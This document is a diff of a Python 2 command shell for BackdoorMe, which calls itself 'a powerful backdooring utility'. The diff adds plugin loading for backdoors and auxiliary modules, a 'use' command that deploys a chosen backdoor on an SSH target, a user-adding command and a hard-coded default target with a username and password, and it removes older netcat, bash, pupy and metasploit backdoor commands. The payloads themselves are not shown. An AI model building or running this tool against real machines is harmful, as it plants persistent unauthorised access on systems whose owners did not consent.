@@ -2,16 +2,21 @@ import os
 import socket
 import subprocess
 import target
+import getpass
 from colorama import *
 from Tkinter import *
 import cmd
 from start import ascii
-from imports import *
+from backdoors import *
+from modules import *
+from auxiliary import *
 
 GOOD = Fore.GREEN + " + " + Fore.RESET
 BAD = Fore.RED + " - " + Fore.RESET
 WARN = Fore.YELLOW + " * " + Fore.RESET
 INFO = Fore.BLUE + " + " + Fore.RESET
+OPEN = Fore.GREEN + "open" + Fore.RESET
+CLOSED = Fore.RED + "closed" + Fore.RESET
 
 def fmtcols(mylist, cols):
     lines = ("\t".join(mylist[i:i+cols]) for i in xrange(0,len(mylist),cols))
@@ -21,8 +26,10 @@ class BackdoorMe(cmd.Cmd):
     prompt = Fore.BLUE + ">> " + Fore.RESET
 
     def __init__(self):
-        cmd.Cmd.__init__(self) 
-        
+        cmd.Cmd.__init__(self)
+        self.enabled_modules = enabled_modules 
+        self.enabled_backdoors = enabled_backdoors
+        self.enabled_aux = enabled_aux 
         self.target_num = 1
         self.port = 22 
         self.targets = {}
@@ -30,36 +37,25 @@ class BackdoorMe(cmd.Cmd):
         proc = subprocess.Popen(["ifconfig | grep inet | head -n1 | cut -d\  -f12 | cut -d: -f2"], stdout=subprocess.PIPE, shell=True)
         self.localIP = proc.stdout.read()
         self.localIP = self.localIP[:-1]
+        self.ctrlc = False
         ascii()
         print "Welcome to BackdoorMe, a powerful backdooring utility. Type \"help\" to see the list of available commands."
         print "Type \"addtarget\" to set a target, and \"open\" to open an SSH connection to that target."
         print "Using local IP of %s." % self.localIP
-    
+        self.addtarget("10.1.0.5", "student", "target123")
+
     def do_help(self, args):
         print "Type \"addtarget\" to set a target, and \"open\" to open an SSH connection to that target."
         print "Using local IP of %s." % self.localIP
         print "\nAvailable commands are: "
-        print fmtcols(["addtarget", "adds a target", "edit target", "edit existing target"], 2)
-
-    def do_addtarget(self, args):
-        hostname = raw_input('Target Hostname: ') #victim host
-        try:
-            socket.inet_aton(hostname)
-        except socket.error:
-            print BAD + "Invalid IP Address."
-            return 
-        uname = raw_input('Username: ') #username for the box to be attacked
-        pword = raw_input('Password: ') #password for the box to be attacked
-        print GOOD + "Target %d Set!" % self.target_num
+        print fmtcols(["addtarget", "adds a target", "edittarget", "edit existing target", "open", "opens an SSH connection to the target", "close", "closes an existing SSH connection to target"], 2)
+        
+    def addtarget(self, hostname, uname, pword):
         t = target.Target(hostname, uname, pword, self.target_num)
         self.targets[self.target_num] = t
         self.target_num += 1
         self.curtarget = t
-
-    def do_edittarget(self, args):
-        t = self.get_target(args)
-        if t == None:
-            return
+    def get_target_info(self):
         hostname = raw_input('Target Hostname: ') #victim host
         try:
             socket.inet_aton(hostname)
@@ -67,20 +63,33 @@ class BackdoorMe(cmd.Cmd):
             print BAD + "Invalid IP Address."
             return 
         uname = raw_input('Username: ') #username for the box to be attacked
-        pword = raw_input('Password: ') #password for the box to be attacked
-        self.target_num -= 1
+        pword = getpass.getpass() #password for the box to be attacked
+        return hostname, uname, pword
+    def do_addtarget(self, args):
+        hostname, uname, pword = self.get_target_info() 
+        print GOOD + "Target %d Set!" % self.target_num
+        self.addtarget(hostname, uname, pword);
+    
+    def do_edittarget(self, args):
+        t = self.get_target(args, connect=False)
+        if t == None:
+            return
+        hostname, uname, pword = self.get_target_info() 
+        t.hostname = hostname
+        t.uname = uname
+        t.pword = pword
+        print(GOOD + "Target edited")
 
-        print GOOD + "Target %d edited" % self.target_num
-        t = target.Target(hostname, uname, pword, self.target_num)
-        self.targets[self.target_num] = t
+
+    def do_set(self, args):
+        if (len(args.split()) == 0 or args.split()[0] != "target"):
+            print(BAD + "Usage is \"set target <target-num>\"")
+            return
+        t = self.get_target(args, connect=False)
+        if t == None:
+            return
         self.curtarget = t
-
-    def do_settarget(self, args):
-        if len(args) == 0 or not target_exists(int(args[0])):
-            print BAD + "No target with that number found. Try adding a target with \"addtarget\" or trying a different target number."
-        else:
-            self.curtarget = self.targets[int(args[0])]
-            print GOOD + "Current target set to %s" % args[0]
+        print GOOD + "Current target set to %s" % args.split()[-1]
     
     def open_conn(self,t):
         try: 
@@ -90,18 +99,10 @@ class BackdoorMe(cmd.Cmd):
             return
         print GOOD + "Connection established."
 
-
     def do_open(self, args):
         t = self.get_target(args)
         if t == None:
             return
-        try: 
-            t.conn()
-        except:
-            print BAD + "Connection failed."
-            return
-        print GOOD + "Connection established."
-    
     def do_close(self, args):
         t = self.get_target(args)
         if t == None:
@@ -113,22 +114,21 @@ class BackdoorMe(cmd.Cmd):
             return
         print GOOD + "Connection closed."
 
-    def get_target(self, args):
+    def get_target(self, args, connect=True):
         t = self.curtarget
-                
-        if (len(args) == 0):
+        if ((len(args.split()) == 1 and not args.split()[-1].isdigit()) or len(args.split()) == 0):
             if self.curtarget == None:
                 print BAD + "No currently set target. Add a target with 'addtarget'."
                 return None
             else:
                 print GOOD + "Using current target %d." % t.target_num
-        elif not self.target_exists(int(args[0])):
+        elif not self.target_exists(int(args.split()[-1])):
             print BAD + "No target with that target ID found." 
             return None
         else:
-            print GOOD + "Using target %s" % args[0]
-            t = self.targets[int(args[0])]
-        if not t.is_open:
+            print GOOD + "Using target %s" % args.split()[-1]
+            t = self.targets[int(args.split()[-1])]
+        if not t.is_open and connect:
             print BAD + "No SSH connection to target. Attempting to open a connection..."
             self.open_conn(t)
   
@@ -137,47 +137,31 @@ class BackdoorMe(cmd.Cmd):
     def target_exists(self, num):
         return (num in self.targets)  
  
-    def do_netcat(self, args):
-        t = self.get_target(args)
-        if t == None:
-            return
-        Netcat(t, self).cmdloop()
-
-    def do_nce(self, args):
-        t = self.get_target(args)
-        if t == None:
+    def do_use(self, args):
+        bd = args.split()[0]
+        if bd in self.enabled_backdoors.keys():
+            t = self.get_target(args)
+            if t == None:
                 return
-        Netcat_Traditional(t, self).cmdloop()
+            self.enabled_backdoors[bd](self).cmdloop()
+        else:
+            print(BAD + args + " backdoor cannot be found.")
 
-    def do_perl(self,args):
-        t = self.get_target(args)
-        if t == None:
-            return
-        Perl(t, self).cmdloop()
-        
-    def do_bash(self, args):
-        t = self.get_target(args)
-        if t == None:
-            return
-        Bash(t, self).cmdloop()
-       
-    def do_pupy(self, args):
-        t=self.get_target(args)
-        if t == None:
-            return
-        Pupy(t, self).cmdloop() 
+    def do_apply(self, args):
+	t = self.get_target(args)
+	if t == None:
+	    return
+	au = args.split()[0]
+	if au in self.enabled_aux.keys():
+	    self.enabled_aux[au](self).cmdloop()
+	else:
+	    print(BAD + args + " auxiliary module cannot be found.")
 
-    def do_python(self, args):
+    def do_userAdd(self, args):
         t = self.get_target(args)
         if t == None:
             return
-        Pyth(t, self).cmdloop()
-       
-    def do_metasploit(self,args):
-        t = self.get_target(args)
-        if t == None:
-            return
-        Metasploit(t, self).cmdloop()
+        UserAdd(t, self).cmdloop()
     
     def do_passwd(self, args):
         t = self.get_target(args)
@@ -205,7 +189,7 @@ class BackdoorMe(cmd.Cmd):
         t = self.get_target(args)
         if t == None:
             return
-
+        
         newPort = raw_input("Please enter the port you want to use for future connections: ")
         t.port = newPort;
         print(GOOD + "SSH Port for target is now: " + t.port)
@@ -223,15 +207,24 @@ class BackdoorMe(cmd.Cmd):
         print GOOD + "Private key copied."
     
     def do_quit(self, args):
-        print "Exiting"
-        exit()
+        self.quit()
     def do_clear(self, args):
         os.system("clear")
     def do_list(self, args):
-        print "Targets: "
-        for num, t in self.targets.iteritems():
-            print "%s - %s %s:%s" % (num, t.hostname, t.uname, t.pword)
-
+        if args == "targets" or len(args) == 0:
+            print(GOOD + "Targets: ")
+            for num, t in self.targets.iteritems():
+                print(" " + (WARN if (num == self.targets.values().index(self.curtarget) + 1) else " * ") + "%s - %s %s:%s - %s" % (num, t.hostname, t.uname, t.pword, (OPEN if (t.is_open) else CLOSED)))
+        if args == "modules" or len(args) == 0:
+            print(GOOD + "Available modules: ")
+            for num, mod in enumerate(sorted(self.enabled_modules.keys())):
+                print("  * " + "%s" % (mod))
+        if args == "backdoors" or len(args) == 0:
+            print(GOOD+ "Available backdoors: ")
+            for mod in sorted(self.enabled_backdoors.keys()):
+                print("  * " + "%s" % (mod))
+        if len(args) != 0 and args != "targets" and args != "backdoors" and args != "modules":
+            print(BAD + "Unknown option " + args)
     def preloop(self):
         cmd.Cmd.preloop(self)   ## sets up command completion
         self._hist    = []      ## No history yet
@@ -240,22 +233,43 @@ class BackdoorMe(cmd.Cmd):
     def do_history(self, args):
         print self._hist
     def do_exit(self, args):
-        return -1
+        self.quit()
     def precmd(self, line):
         self._hist += [ line.strip() ]
-        return line 
+        self.ctrlc = False
+        return line
+        
     def default(self, line):       
         try:
             print GOOD + "Executing \"" + line + "\""
             os.system(line)
         except Exception, e:
             print e.__class__, ":", e 
- 
+    def cmdloop(self):
+        try:
+            cmd.Cmd.cmdloop(self)
+        except KeyboardInterrupt:
+            if not self.ctrlc: 
+                self.ctrlc = True
+                print("\n" + BAD + "Please run \"quit\" or \"exit\" to exit, or press Ctrl-C again.")
+                self.cmdloop()
+            else:
+                print("")
+                self.quit()            
     def do_EOF(self, line):
         print ""
         return True
     def emptyline(self):
         return
-BackdoorMe().cmdloop()
+    def quit(self):
+        print(BAD + "Exiting...")
+        exit()
+        return
+
+def main():
+    BackdoorMe().cmdloop()
+
+if __name__ == "__main__":
+    main()
 
 
